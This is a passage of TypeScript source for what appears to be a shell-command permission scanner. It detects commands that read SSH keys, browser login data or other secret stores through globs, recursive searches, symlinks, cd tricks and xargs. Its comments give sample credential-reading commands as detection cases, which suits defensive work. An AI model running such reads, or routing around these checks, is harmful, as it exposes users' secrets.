  spend?: ScanWork;
}

function createScanState(cwd: string | undefined, dotglob: boolean, spend?: ScanWork, command = ""): ScanState {
  let steps = 0;
  let chars = 0;
  const state: ScanState = { cwds: [cwd], cwdUnknown: false, cwdVersion: 0, dirChanged: false,
    homeReassigned: HOME_REASSIGNMENT.test(command),
    cdRedirects: CD_REDIRECTION.test(command) || (process.env.CDPATH ?? "") !== "",
    functions: [], feedsXargs: false, metadataListing: false, dotglob, sensitive: null, network: false, hidden: false,
    match: createSensitivePathMatcher("read"), pathResults: new Map(), fallbackSteps: 0 };
  // zsh `autocd` turns any bare directory word into a `cd`.
  if (/auto_?cd/i.test(command)) markCwdUnknown(state, "autocd can change directory");
  state.spend = spend ?? ((nextSteps, nextChars = 0) => {
    if (steps + nextSteps > SHELL_PATH_SCAN_LIMITS.steps || chars + nextChars > SHELL_PATH_SCAN_LIMITS.chars) {
      state.ordinaryAsk = "Analysis budget exceeded";
      throw new ShellScanBudgetError(state.ordinaryAsk);
    }
    steps += nextSteps;
    chars += nextChars;
  });
  return state;
}

function lexicalPathHit(glob: string, cwd: string | undefined, state: ScanState, braceExpansion: boolean): string | null {
  const spend: ScanWork = (steps) => {
    if (state.fallbackSteps + steps > SHELL_PATH_SCAN_LIMITS.steps) throw new ShellScanBudgetError("Analysis budget exceeded");
    state.fallbackSteps += steps;
  };
  const globEvidence = hasWildcard(glob) || (braceExpansion && glob.includes("{"));
  if (globEvidence) {
    try {
      const expanded = braceExpansion ? expandBraces(glob, spend) : [glob];
      if (expanded.length >= BRACE_EXPANSION_LIMIT) return "glob too broad to rule out a sensitive path";
      for (const candidate of expanded) {
        const hit = sensitivePathHit(candidate, cwd, state.dotglob, state.match, spend, false);
        if (hit) return hit;
      }
      return null;
    } catch (error) {
      if (!(error instanceof ShellScanBudgetError)) throw error;
      return "glob too broad to rule out a sensitive path";
    }
  }
  // Plain lexical checks are linear in the bounded source text against the fixed path catalogue; they do not perform filesystem or glob expansion.
  const literal = foldCanonicalPathSeparators(unescapeGlob(glob));
  const path = isAbsolute(literal) ? literal : resolve(cwd ?? "/", literal);
  return matchShellPath(path, state.match, false);
}

function checkGlob(glob: string, state: ScanState, braceExpansion = false): void {
  for (const candidate of argumentCandidates(glob)) {
    // A relative path names a location under every directory the command may be in.
    for (const cwd of [...state.cwds]) {
      if (state.sensitive) return;
      // Canonical nulls cannot answer the conservative, filesystem-free pass: a glob may reach a sensitive name whose existence was not established.
      const resultKey = (): string => `${state.ordinaryAsk ? "lexical" : "canonical"}:${braceExpansion ? "brace" : "literal"}:${cwd ?? ""}\0${candidate}`;
      if (state.pathResults.has(resultKey())) {
        state.sensitive = state.pathResults.get(resultKey()) ?? null;
      } else {
        try {
          state.sensitive = state.ordinaryAsk ? lexicalPathHit(candidate, cwd, state, braceExpansion)
            : sensitivePathHit(candidate, cwd, state.dotglob, state.match, state.spend);
        } catch (error) {
          if (!(error instanceof ShellScanBudgetError)) throw error;
          state.ordinaryAsk = error.message;
          state.sensitive = lexicalPathHit(candidate, cwd, state, braceExpansion);
        }
        state.pathResults.set(resultKey(), state.sensitive);
      }
      if (state.sensitive && state.metadataListing) confineListingGlob(candidate, cwd, state);
    }
  }
}

// Hit reasons that say the glob could not be bounded at all; those stay a floor.
const UNBOUNDED_GLOB = "glob too broad to rule out a sensitive path";

// `ls ~/Library/Application\ Support/*` lists the names in a protected directory without reading a file. When only the expansion reaches the protected entry (its literal prefix does not), the hit becomes an ordinary ask, which the sandboxed lane leaves to the OS floor. A glob whose literal prefix is already protected (`ls ~/.ssh/*`) stays a floor.
function confineListingGlob(candidate: string, cwd: string | undefined, state: ScanState): void {
  if (!hasWildcard(candidate) || state.sensitive === UNBOUNDED_GLOB) return;
  const absolute = isAbsolute(candidate) ? candidate : resolve(cwd ?? "/", candidate);
  const segments = absolute.split(/[\\/]/);
  const firstWild = segments.findIndex(hasWildcard);
  const prefix = unescapeGlob(segments.slice(0, Math.max(firstWild, 0)).join("/")) || "/";
  if (matchShellPath(prefix, state.match, !state.ordinaryAsk)) return;
  state.confinedAsk ??= `listing glob expands into ${state.sensitive}`;
  state.sensitive = null;
}

// Programs that list names and metadata without reading file contents.
const METADATA_LISTERS = new Set(["ls", "gls", "du", "gdu", "stat", "gstat", "tree", "eza", "exa", "lsd"]);

function isMetadataListing(cmd: ShellCommand, state: ScanState): boolean {
  // A listing piped into `xargs` becomes the reader's arguments.
  if (state.feedsXargs || cmd.words.length === 0) return false;
  const argv = commandArgv(cmd);
  const at = Math.min(wrapperCommand(argv).index, argv.length - 1);
  const name = program(argv[at])?.toLowerCase();
  if (name === undefined || !METADATA_LISTERS.has(name)) return false;
  // Some listers also read a file the caller names, and print or quote it: `tree --fromfile f`, `tree --hintro=f`, `du --files0-from=f`, `du -X f`, `lsd --config-file f`. Such a command is a content read, not a listing.
  return !cmd.words.slice(at + 1).some((word) => {
    const head = literalHead(word);
    if (head === "--") return false;
    if (/^--[A-Za-z0-9-]*(?:file|from|intro|outro)/i.test(head)) return true;
    return (name === "du" || name === "gdu") && /^-[A-Za-z]*X/.test(head);
  });
}

// Runs `scan` once per shell home anchor, resolving the anchors only if the scan reads one.
function scanEachHome(scan: (home: () => string) => void): void {
  let homes: string[] | undefined;
  scan(() => (homes ??= expandShellTildePaths("~"))[0]!);
  for (const home of homes?.slice(1) ?? []) scan(() => home);
}

function checkRawText(raw: string, state: ScanState): void {
  scanEachHome((home) => {
    let globs: string[];
    try { globs = state.ordinaryAsk ? [rawGlobText(raw, home)] : rawGlobs(raw, home, state.spend); }
    catch (error) {
      if (!(error instanceof ShellScanBudgetError)) throw error;
      state.ordinaryAsk = error.message;
      globs = [rawGlobText(raw, home)];
    }
    for (const glob of globs) checkGlob(glob, state, true);
  });
}

function checkWord(word: ShellWord, state: ScanState): void {
  for (const part of word.parts) {
    if (part.kind === "substitution") scanStatement(part.body, state);
    else if (part.kind === "parameter-choice") checkWord(part.operand, state);
  }
  if (state.sensitive) return;
  let raw = false;
  scanEachHome((home) => {
    if (raw) return;
    const glob = wordGlob(word, home);
    if (glob === null) { raw = true; checkRawText(word.source.raw, state); }
    else checkGlob(glob, state);
  });
}

// Path-like tokens inside code the matcher cannot parse (`open("/home/u/.ssh/id_rsa")`).
function scanCodeText(text: string, state: ScanState): void {
  if (state.sensitive) return;
  const names = new Set(sensitiveNames());
  for (const token of text.split(/[\s'"`;|&()<>,{}[\]=:+]+/)) {
    if (!token || !(token.includes("/") || /^[.~$]/.test(token) || names.has(token))) continue;
    checkRawText(token, state);
    if (state.sensitive) return;
  }
}

// The sensitive-table pattern one path-like argument reaches, or null — for a quoted argument of non-bash code whose path holds spaces (`"…\User Data\Default\Login Data"`), which the token scan would split.
export function sensitivePathInArgumentText(text: string, cwd: string | undefined, spend?: ScanWork): string | null {
  const state = createScanState(cwd, false, spend);
  checkRawText(text, state);
  return state.sensitive;
}

function commandArgv(cmd: ShellCommand): (string | undefined)[] {
  return cmd.words.map((word) => staticShellWord(word));
}

// Code-text scanning is independent of whether raw argv can match a rule.
function needsCodeTextScan(cmd: ShellCommand): boolean {
  if (cmd.assignments.some((assignment) => codeCarryingVariable(assignment.name))) return true;
  if (arithmeticEvaluationReason(cmd)) return true;
  if (cmd.words.length === 0) return false;
  const argv = commandArgv(cmd);
  return argv[0] === undefined || hiddenCodeReason(argv) !== null || opaqueRunnerReason(argv) !== null;
}

function scanCodeOf(cmd: ShellCommand, state: ScanState): void {
  for (const word of cmd.words) scanCodeText(staticShellWord(word) ?? word.source.raw, state);
  for (const redirect of cmd.redirects) {
    if (redirect.data) scanCodeText(staticShellWord(redirect.data) ?? redirect.data.source.raw, state);
  }
}

function scanRedirectTarget(target: ShellWord, state: ScanState): void {
  if (NETWORK_DEVICE.test(target.source.raw)) state.network = true;
  checkWord(target, state);
}

// Entries a symlink-following search may inspect before it is refused as too large to rule out.
const SYMLINK_SCAN_ENTRY_LIMIT = 5000;

// What a search walks: whether it recurses, which symlinks it follows (`all` below the roots, or only `roots` named on the command line), and the indexes of its root words. `find` only lists names, so it is not a content search (`ancestorFloor: false`); only the links it follows matter — unless it hands every file to a program (`-exec cat {}`) or to `xargs`. Archivers and copy tools (`tar c`, `zip -r`, `cp -r`, `rsync -a`, `scp -r`) read every file below their sources, like a content search. `defaultRoot` is whether no root means `.`.
interface SearchShape {
  recursive: boolean;
  follow: "all" | "roots" | false;
  ancestorFloor: boolean;
  roots: number[];
  defaultRoot: boolean;
  // A root list the command reads from a file (`tar -T list`).
  dynamicRoots?: true;
}

type Argv = readonly (string | undefined)[];

// Operand indexes and option names of a getopt-style command line.
function parseOptions(argv: Argv, shortValues: string, longValues: readonly string[]): { operands: number[]; short: Set<string>; long: Set<string> } {
  const operands: number[] = [];
  const short = new Set<string>();
  const long = new Set<string>();
  for (let index = 1; index < argv.length; index += 1) {
    const word = argv[index];
    if (word === undefined || word === "-" || !word.startsWith("-")) { operands.push(index); continue; }
    if (word === "--") { for (let rest = index + 1; rest < argv.length; rest += 1) operands.push(rest); break; }
    if (word.startsWith("--")) {
      const [name = "", value] = word.slice(2).split("=");
      long.add(name);
      if (value === undefined && longValues.includes(name)) index += 1;
      continue;
    }
    for (let at = 1; at < word.length; at += 1) {
      short.add(word[at]!);
      if (shortValues.includes(word[at]!)) { if (at === word.length - 1) index += 1; break; }
    }
  }
  return { operands, short, long };
}

function isRemoteOperand(text: string | undefined): boolean {
  return text !== undefined && !/^[./~]/.test(text) && /^[^/]*:/.test(text);
}

function archiveShape(argv: Argv): SearchShape | null {
  const bsd = process.platform === "darwin";
  // `tar czf out.tgz.`: a leading bundle without a dash, its values in order.
  const bundle = argv[1] !== undefined && /^[A-Za-z]+$/.test(argv[1]) ? argv[1] : undefined;
  const values = bsd ? "fCTXbIs" : "fCTXbKNgIHLV";
  let rest: Argv = argv;
  const bundleShort = new Set<string>();
  if (bundle !== undefined) {
    let consumed = 0;
    for (const letter of bundle) { bundleShort.add(letter); if (values.includes(letter)) consumed += 1; }
    rest = [argv[0], ...argv.slice(2 + consumed)];
  }
  const parsed = parseOptions(rest, values, ["file", "directory", "files-from", "exclude-from", "blocking-factor", "format", "use-compress-program", "exclude"]);
  const short = new Set([...bundleShort, ...parsed.short]);
  const offset = bundle === undefined ? 0 : argv.length - rest.length;
  if (!["c", "r", "u"].some((letter) => short.has(letter)) && !["create", "append", "update"].some((name) => parsed.long.has(name))) return null;
  const follow: SearchShape["follow"] = short.has("h") || parsed.long.has("dereference") || (bsd && short.has("L")) ? "all" : bsd && short.has("H") ? "roots" : false;
  return {
    recursive: true, follow, ancestorFloor: true, defaultRoot: false,
    roots: parsed.operands.map((index) => index + offset),
    ...(short.has("T") || parsed.long.has("files-from") ? { dynamicRoots: true as const } : {}),
  };
}

function copyShape(argv: Argv, name: string): SearchShape | null {
  if (name === "zip") {
    const parsed = parseOptions(argv, "bnstxiPOZ", []);
    if (!parsed.short.has("r") && !parsed.short.has("R") && !parsed.long.has("recurse-paths") && !parsed.long.has("recurse-patterns")) return null;
    // zip stores a link's target unless -y.
    const follow = parsed.short.has("y") || parsed.long.has("symlinks") ? false : "all";
    return { recursive: true, follow, ancestorFloor: true, defaultRoot: false, roots: parsed.operands.slice(1) };
  }
  if (name === "cp" || name === "gcp") {
    const parsed = parseOptions(argv, "tS", ["target-directory", "suffix"]);
    if (!["r", "R", "a"].some((letter) => parsed.short.has(letter)) && !parsed.long.has("recursive") && !parsed.long.has("archive")) return null;
    const follow = parsed.short.has("L") || parsed.long.has("dereference") ? "all" : parsed.short.has("H") ? "roots" : false;
    const target = parsed.short.has("t") || [...parsed.long].some((option) => option === "target-directory");
    return { recursive: true, follow, ancestorFloor: true, defaultRoot: false, roots: target ? parsed.operands : parsed.operands.slice(0, -1) };
  }
  if (name === "rsync") {
    const parsed = parseOptions(argv, "efTBM", ["rsh", "filter", "exclude", "include", "files-from", "temp-dir", "rsync-path", "log-file", "partial-dir", "exclude-from", "include-from", "password-file", "compare-dest", "copy-dest", "link-dest"]);
    if (!parsed.short.has("r") && !parsed.short.has("a") && !parsed.long.has("recursive") && !parsed.long.has("archive")) return null;
    const follow = parsed.short.has("L") || parsed.short.has("k") || parsed.long.has("copy-links") || parsed.long.has("copy-unsafe-links") || parsed.long.has("copy-dirlinks") ? "all" : false;
    return {
      recursive: true, follow, ancestorFloor: true, defaultRoot: false,
      roots: parsed.operands.slice(0, -1).filter((index) => !isRemoteOperand(argv[index])),
      ...(parsed.long.has("files-from") ? { dynamicRoots: true as const } : {}),
    };
  }
  if (name === "scp") {
    const parsed = parseOptions(argv, "cFiJloPSD", []);
    if (!parsed.short.has("r")) return null;
    return { recursive: true, follow: "all", ancestorFloor: true, defaultRoot: false, roots: parsed.operands.slice(0, -1).filter((index) => !isRemoteOperand(argv[index])) };
  }
  return null;
}

// `fd`: a name listing, unless it runs a program on every match or feeds `xargs`.
function fdShape(argv: Argv, feedsXargs: boolean): SearchShape {
  const values = "etEdcjSoghp";
  const longValues = ["extension", "type", "exclude", "max-depth", "min-depth", "exact-depth", "color", "threads", "size", "changed-within", "changed-before", "owner", "base-directory", "search-path", "ignore-file", "max-results", "path-separator", "and"];
  const exec = argv.findIndex((word) => word === "-x" || word === "--exec" || word === "-X" || word === "--exec-batch");
  const parsed = parseOptions(exec < 0 ? argv : argv.slice(0, exec), values, longValues);
  const searchPaths = argv.flatMap((word, index) => word === "--search-path" ? [index + 1] : []);
  const follow = parsed.short.has("L") || parsed.long.has("follow") ? "all" : false;
  return { recursive: true, follow, ancestorFloor: exec >= 0 || feedsXargs, defaultRoot: true, roots: [...parsed.operands.slice(1), ...searchPaths] };
}

// `ls` lists names; fed to `xargs` its entries (all of them with `-R`) become reads.
function lsShape(argv: Argv): SearchShape {
  const parsed = parseOptions(argv, "ITw", ["color", "format", "sort", "time", "width", "tabsize", "hide", "ignore", "block-size", "indicator-style", "quoting-style", "time-style"]);
  const follow = parsed.short.has("L") || parsed.long.has("dereference") ? "all" : parsed.short.has("H") ? "roots" : false;
  return { recursive: true, follow, ancestorFloor: true, defaultRoot: true, roots: parsed.operands };
}

// `du -a` lists names like `find`; fed to `xargs` its paths become reads.
function duShape(argv: Argv, feedsXargs: boolean): SearchShape {
  const parsed = parseOptions(argv, "BdtX", ["block-size", "max-depth", "threshold", "exclude", "exclude-from", "time-style"]);
  const follow = parsed.short.has("L") || parsed.long.has("dereference") ? "all" : parsed.short.has("H") || parsed.short.has("D") ? "roots" : false;
  const all = parsed.short.has("a") || parsed.long.has("all");
  return { recursive: true, follow, ancestorFloor: feedsXargs && all, defaultRoot: true, roots: parsed.operands };
}

function findShape(argv: readonly (string | undefined)[], feedsXargs = false): SearchShape {
  let index = 1;
  let follow: SearchShape["follow"] = false;
  const roots: number[] = [];
  // Leading options: GNU `-H`/`-L`/`-P`, `-D <flags>`, `-O<level>`; BSD also `-E`, `-X`, `-d`, `-s`, `-x` and `-f <path>` (that path is a root).
  while (index < argv.length && argv[index] !== undefined) {
    const word = argv[index]!;
    if (word === "-f") { roots.push(index + 1); index += 2; continue; }
    if (word === "-D") { index += 2; continue; }
    if (!/^-(?:[HLPEXdsx]+|O\d*)$/.test(word)) break;
    // The last of `-H`/`-L`/`-P` wins.
    for (const letter of word.slice(1)) {
      if (letter === "L") follow = "all";
      else if (letter === "H") follow = "roots";
      else if (letter === "P") follow = false;
    }
    index += 1;
  }
  while (index < argv.length && !(argv[index] !== undefined && /^[-(!,]/.test(argv[index]!))) roots.push(index++);
  if (argv.slice(index).some((word) => word === undefined || word === "-follow")) follow = "all";
  // `-exec cat {} ;` and an `xargs` stage read every file found.
  const reads = feedsXargs || argv.slice(index).some((word) => word === undefined || word === "-exec" || word === "-execdir" || word === "-ok" || word === "-okdir");
  return { recursive: true, follow, ancestorFloor: reads, defaultRoot: true, roots: roots.filter((root) => root < argv.length) };
}

// `grep`/`rg`. GNU grep follows links under `-R`/`--dereference-recursive`; BSD grep (macOS `/usr/bin/grep`) recurses with `-r` or `-R` and follows links only with `-S` (its default is `-p`). `ggrep` is GNU everywhere.
function contentSearchShape(argv: readonly (string | undefined)[], name: string): SearchShape {
  const grep = name !== "rg";
  const bsd = grep && name !== "ggrep" && process.platform === "darwin";
  let recursive = !grep;
  let follow: SearchShape["follow"] = false;
  let patternGiven = false;
  const operands: number[] = [];
  let delimited = false;
  for (let index = 1; index < argv.length; index += 1) {
    const word = argv[index];
    if (word === undefined) { operands.push(index); continue; }
    if (!delimited && word === "--") { delimited = true; continue; }
    if (delimited || !word.startsWith("-") || word === "-") { operands.push(index); continue; }
    if (word.startsWith("--")) {
      const [option = "", value] = word.slice(2).toLowerCase().split("=");
      if (option === "regexp" || option === "file") patternGiven = true;
      if (grep && option === "directories") {
        // `--directories=recurse` or `--directories recurse`.
        const directories = value ?? argv[index + 1];
        if (directories === undefined || directories === "recurse") recursive = true;
        if (value === undefined) index += 1;
      }
      if (grep && (option === "recursive" || option === "dereference-recursive")) recursive = true;
      if ((grep && option === "dereference-recursive") || (!grep && option === "follow")) follow = "all";
      continue;
    }
    const cluster = word.slice(1);
    if (/[ef]/.test(cluster)) patternGiven = true;
    if (grep && /[rR]/.test(cluster)) recursive = true;
    if (grep && cluster === "d") {
      if (argv[index + 1] === undefined || argv[index + 1] === "recurse") recursive = true;
      index += 1;
      continue;
    }
    if (grep ? (bsd ? cluster.includes("S") : cluster.includes("R")) : cluster.includes("L")) follow = "all";
  }
  // Every operand but the pattern is a root; an option value counted as a root only widens the check.
  return { recursive, follow, ancestorFloor: true, defaultRoot: true, roots: patternGiven ? operands : operands.slice(1) };
}

function searchShape(argv: readonly (string | undefined)[], feedsXargs = false): SearchShape | null {
  const name = program(argv[0])?.toLowerCase();
  if (name === undefined) return null;
  if (name === "find" || name === "gfind") return findShape(argv, feedsXargs);
  if (name === "grep" || name === "egrep" || name === "fgrep" || name === "ggrep" || name === "rg") return contentSearchShape(argv, name);
  if (name === "tar" || name === "gtar" || name === "bsdtar") return archiveShape(argv);
  if (name === "zip" || name === "cp" || name === "gcp" || name === "rsync" || name === "scp") return copyShape(argv, name);
  if (name === "fd" || name === "fdfind") return fdShape(argv, feedsXargs);
  if (name === "du" || name === "gdu") return duShape(argv, feedsXargs);
  // A plain listing reads nothing; only its consumer can.
  if ((name === "ls" || name === "gls") && feedsXargs) return lsShape(argv);
  return null;
}

// A symlink below `root` that resolves into a secret-holding location, or the reason the walk could not rule one out.
function sensitiveSymlinkUnder(root: string, state: ScanState): string | null {
  const pending = [root];
  let entries = 0;
  while (pending.length > 0) {
    const directory = pending.pop()!;
    let children: import("node:fs").Dirent[];
    try { children = readdirSync(directory, { withFileTypes: true }); } catch { continue; }
    for (const child of children) {
      entries += 1;
      if (entries > SYMLINK_SCAN_ENTRY_LIMIT) return `symlink-following search of ${root} too large to rule out a link to a sensitive path`;
      const path = join(directory, child.name);
      if (child.isSymbolicLink()) {
        let target: string;
        try { target = caseFoldForMatch(canonicalizePathForMatch(realpathSync(path))); } catch { continue; }
        const hit = state.match(target) ?? sensitiveLocationUnder(target);
        if (hit) return `symlink ${path} reaches ${hit}`;
        // A link to a directory is walked through its target by the search.
        try { if (statSync(path).isDirectory()) pending.push(path); } catch { /* dangling link */ }
      } else if (child.isDirectory()) {
        pending.push(path);
      }
    }
  }
  return null;
}

// A recursive `grep`/`rg` reads every file below its roots, so the floor covers a root at or above a secret-holding directory (`grep -r x ~`, `rg --hidden x /`). For any search that follows symlinks (GNU `grep -R`, BSD `grep -S`, `rg -L`, `find -L`/`-follow`/`-H`) it also covers a followed link that resolves into one. `find` alone only lists names, like `ls -R`.
function scanRecursiveSearch(cmd: ShellCommand, state: ScanState): void {
  if (state.sensitive) return;
  const fullArgv = commandArgv(cmd);
  // Look through transparent wrappers (`sudo`, `env -C`, `nice`, `xargs`).
  const offset = Math.min(wrapperCommand(fullArgv).index, fullArgv.length);
  const argv = fullArgv.slice(offset);
  const shape = searchShape(argv, state.feedsXargs);
  if (!shape?.recursive) return;
  const viaXargs = shape.ancestorFloor && fullArgv.slice(0, offset).some((word) => word !== undefined && program(word) === "xargs");
  if (viaXargs) {
    // `xargs` appends roots from its input, which the scan cannot see. Roots the feeding stages name (or the directory they list) at or above a store are a floor; otherwise the OS floor confines the read and it asks.
    const reach = xargsUpstreamReach(state);
    if (reach) {
      state.sensitive = `recursive read of ${argv[0]} over roots supplied through xargs from ${reach}`;
      return;
    }
    state.confinedAsk ??= `recursive read of ${argv[0]} over roots supplied through xargs`;
  }
  if (shape.dynamicRoots) {
    state.ordinaryAsk ??= "recursive search root is not static";
    return;
  }
  const roots: string[] = [];
  for (const relativeIndex of shape.roots) {
    const index = relativeIndex + offset;
    let dynamic = false;
    // A `$HOME` root stands for every policy home.
    scanEachHome((home) => {
      if (dynamic) return;
      const glob = wordGlob(cmd.words[index]!, home);
      if (glob === null || glob.includes(DYNAMIC_SEGMENT)) { dynamic = true; return; }
      // A wildcard root stands for its static directory prefix.
      const segments = glob.split(/[\\/]/);
      const firstWild = segments.findIndex(hasWildcard);
      roots.push(unescapeGlob((firstWild < 0 ? segments : segments.slice(0, firstWild)).join("/")) || (glob.startsWith("/") ? "/" : "."));
    });
    if (dynamic) {
      state.ordinaryAsk ??= "recursive search root is not static";
      return;
    }
  }
  if (roots.length === 0) {
    // `xargs` supplies the roots, which were judged above.
    if (!shape.defaultRoot || viaXargs) return;
    roots.push(".");
  }
  for (const root of roots) {
    if (!isAbsolute(root) && state.cwdUnknown) {
      // After a `cd` to an unknown directory a relative root may be the home or any directory above a secret store; it cannot be ruled out.
      state.sensitive = `recursive search of ${root} after a cd whose target is not static`;
      return;
    }
    // Without a working directory a relative root names no location; the decision path always supplies one.
    for (const cwd of isAbsolute(root) ? [undefined] : state.cwds.filter((dir) => dir !== undefined)) {
      searchRoot(isAbsolute(root) ? root : resolve(cwd!, root), shape, state);
      if (state.sensitive) return;
    }
  }
}

// Where the stages feeding an `xargs` reader may take it: a static path word they name, or the directory they run in, at or above a protected entry. A word that is not static is unknown, which stays an ask. An unknown cwd is a floor, as for any relative recursive search after a non-static cd.
function xargsUpstreamReach(state: ScanState): string | null {
  if (state.cwdUnknown) return "a stage after a cd whose target is not static";
  const cwds = state.cwds.filter((dir): dir is string => dir !== undefined);
  const reaches = (absolute: string): string | null => {
    const canonical = caseFoldForMatch(canonicalizePathForMatch(absolute));
    const hit = state.match(canonical) ?? sensitiveLocationUnder(canonical);
    return hit ? `${absolute} (reaches ${hit})` : null;
  };
  for (const cwd of cwds) {
    const hit = reaches(cwd);
    if (hit) return hit;
  }
  for (const stage of state.xargsUpstream ?? []) {
    for (const cmd of commandsIn(stage)) {
      for (const word of cmd.words.slice(1)) {
        if (literalHead(word).startsWith("-")) continue;
        let hit: string | null = null;
        scanEachHome((home) => {
          if (hit) return;
          const glob = wordGlob(word, home);
          if (glob === null || glob.includes(DYNAMIC_SEGMENT)) return;
          const segments = glob.split(/[\\/]/);
          const firstWild = segments.findIndex(hasWildcard);
          const root = unescapeGlob((firstWild < 0 ? segments : segments.slice(0, firstWild)).join("/")) || (glob.startsWith("/") ? "/" : ".");
          for (const base of isAbsolute(root) ? [undefined] : cwds) {
            hit ??= reaches(isAbsolute(root) ? root : resolve(base!, root));
          }
        });
        if (hit) return hit;
      }
    }
  }
  return null;
}

function searchRoot(absolute: string, shape: SearchShape, state: ScanState): void {
  const canonical = caseFoldForMatch(canonicalizePathForMatch(absolute));
  // A content search reads every file below its root.
  const above = shape.ancestorFloor ? sensitiveLocationUnder(canonical) : null;
  if (above) { state.sensitive = `recursive search of ${absolute} reaches ${above}`; return; }
  if (shape.follow) {
    // A followed root link counts like any other followed link.
    const lexical = caseFoldForMatch(foldCanonicalPathSeparators(absolute));
    const viaLink = canonical !== lexical ? state.match(canonical) ?? sensitiveLocationUnder(canonical) : null;
    if (viaLink) { state.sensitive = `search root ${absolute} links to ${viaLink}`; return; }
  }
  if (shape.follow === "all") {
    const link = sensitiveSymlinkUnder(absolute, state);
    if (link) { state.sensitive = link; return; }
  }
}

// Effective working directory A relative path resolves against the directory the shell is in when it runs, not the tool's cwd: `cd ~ && grep -r x.` searches the home.

// Directories one command may be in before tracking gives up and treats the cwd as unknown.
const CWD_CANDIDATE_LIMIT = 16;
// An assignment, declaration or removal of HOME anywhere in the command.
const HOME_REASSIGNMENT = /(?:^|[^A-Za-z0-9_$])HOME\+?=|\b(?:export|declare|typeset|local|readonly|unset|read)\s(?:[^;&|\n]*\s)?HOME(?=[\s=;&|)]|$)/;
// Settings that make a relative `cd` resolve somewhere other than the cwd.
const CD_REDIRECTION = /\bcdpath\b|cdable_vars/i;

function markCwdUnknown(state: ScanState, reason: string): void {
  state.cwdUnknown = true;
  state.cdAsk ??= reason;
}

function addCwd(state: ScanState, directory: string): void {
  if (state.cwds.includes(directory)) return;
  if (state.cwds.length >= CWD_CANDIDATE_LIMIT) {
    markCwdUnknown(state, "too many directory changes to track");
    return;
  }
  state.cwds.push(directory);
  state.cwdVersion += 1;
}

// The static directory a `cd`/`pushd` operand names under each candidate cwd, or a reason it is unknown.
function cdTargets(word: ShellWord, state: ScanState, cdpath = true, prefix = ""): string[] | string {
  // A `~`/`$HOME` target stands for every policy home.
  let targets: string[] | string = [];
  scanEachHome((home) => {
    if (typeof targets === "string") return;
    const next = cdTargetsUnder(word, state, home, cdpath, prefix);
    targets = typeof next === "string" ? next : [...targets, ...next];
  });
  return targets;
}

function cdTargetsUnder(word: ShellWord, state: ScanState, home: () => string, cdpath: boolean, prefix: string): string[] | string {
  const whole = wordGlob(word, home);
  if (whole === null || whole.includes(DYNAMIC_SEGMENT)) return "cd target is not static";
  // An attached option value (`-Cdir`, `--chdir=dir`) follows its option text.
  const glob = whole.slice(escapeGlob(prefix).length);
  // bash also expands a `~` after `=` in an option word; count both spellings.
  const homeSpelling = prefix.endsWith("=") && /^~(?:\/|$)/.test(glob) ? [resolve(home(), `.${glob.slice(1)}`)] : [];
  if (hasWildcard(glob)) return "cd target is a glob";
  if (state.homeReassigned && word.parts.some((part) => part.kind === "parameter" && part.name === "HOME")) {
    return "cd target depends on a reassigned HOME";
  }
  const target = unescapeGlob(glob);
  if (target === "") return "cd target is empty";
  if (isAbsolute(target)) return [target, ...homeSpelling];
  // CDPATH is consulted for a relative name that does not start with `.`/`..`.
  if (cdpath && state.cdRedirects && !/^\.\.?(?:\/|$)/.test(target)) return "cd target may resolve through CDPATH";
  if (state.cwdUnknown || state.cwds.includes(undefined)) return "cd target is relative to an unknown working directory";
  return [...state.cwds.map((cwd) => resolve(cwd!, target)), ...homeSpelling];
}

// Options that run one command in another directory. `short`/`long` name the option; `leading` stops at the first operand (git's options precede its subcommand; `git log -C` detects copies).
interface CwdSwitchGrammar { short?: readonly string[]; long?: readonly string[]; leading?: true }
const CWD_SWITCHES: Readonly<Record<string, CwdSwitchGrammar>> = {
  env: { short: ["C"], long: ["chdir"], leading: true },
  "systemd-run": { long: ["working-directory"], leading: true },
  proot: { short: ["w"], long: ["pwd", "cwd"], leading: true },
  wsl: { long: ["cd"], leading: true },
  git: { short: ["C"], long: ["work-tree"], leading: true },
  make: { short: ["C"], long: ["directory"] },
  gmake: { short: ["C"], long: ["directory"] },
  tar: { short: ["C"], long: ["directory"] },
  gtar: { short: ["C"], long: ["directory"] },
  bsdtar: { short: ["C"], long: ["directory"] },
  ninja: { short: ["C"] },
  meson: { short: ["C"] },
  cargo: { short: ["C"] },
  go: { short: ["C"], leading: true },
  just: { short: ["d"], long: ["working-directory"] },
  npm: { short: ["C"], long: ["prefix"] },
  pnpm: { short: ["C"], long: ["dir", "prefix"] },
  yarn: { long: ["cwd"] },
  bun: { long: ["cwd"] },
  uv: { long: ["directory", "project"] },
  poetry: { short: ["C", "P"], long: ["directory", "project"] },
};

// The leading literal text of a word, which an option name must sit in.
function literalHead(word: ShellWord): string {
  const first = word.parts[0];
  return first?.kind === "literal" ? first.value : "";
}

// Point this one command at the directories its cwd switches name, on top of the candidates it already had (an operand before `tar -C` still resolves against the old cwd). A non-static switch makes the cwd unknown for the command and asks. Returns the restore for after the command, or undefined.
function applyCommandCwdSwitch(cmd: ShellCommand, state: ScanState): (() => void) | undefined {
  const argv = commandArgv(cmd);
  const switched: string[] = [];
  let unknown: string | undefined;
  for (let start = 0; start < cmd.words.length; start += 1) {
    const grammar = argv[start] === undefined ? undefined : CWD_SWITCHES[program(argv[start])!.toLowerCase()];
    if (!grammar) continue;
    for (let index = start + 1; index < cmd.words.length; index += 1) {
      const head = literalHead(cmd.words[index]!);
      if (head === "--") break;
      if (!head.startsWith("-")) {
        if (grammar.leading && !/=/.test(head)) break;
        continue;
      }
      let valueWord: ShellWord | undefined;
      let prefix = "";
      const long = /^--([A-Za-z-]+)(=?)/.exec(head);
      if (long && grammar.long?.includes(long[1]!)) {
        if (long[2]) { valueWord = cmd.words[index]; prefix = `--${long[1]}=`; } else { valueWord = cmd.words[index + 1]; index += 1; }
      } else if (!long && head.length >= 2 && grammar.short?.includes(head[1]!)) {
        if (head.length > 2 || cmd.words[index]!.parts.length > 1) { valueWord = cmd.words[index]; prefix = head.slice(0, 2); }
        else { valueWord = cmd.words[index + 1]; index += 1; }
      } else continue;
      if (valueWord === undefined) { unknown ??= `${argv[start]} directory option has no value`; continue; }
      const targets = cdTargets(valueWord, state, false, prefix);
      if (typeof targets === "string") unknown ??= targets;
      else switched.push(...targets);
    }
  }
  if (switched.length === 0 && unknown === undefined) return undefined;
  const saved = { cwds: state.cwds, unknown: state.cwdUnknown };
  state.cwds = [...new Set([...state.cwds, ...switched])];
  if (unknown !== undefined) markCwdUnknown(state, unknown);
  return () => {
    state.cwds = saved.cwds;
    state.cwdUnknown = saved.unknown;
  };
}

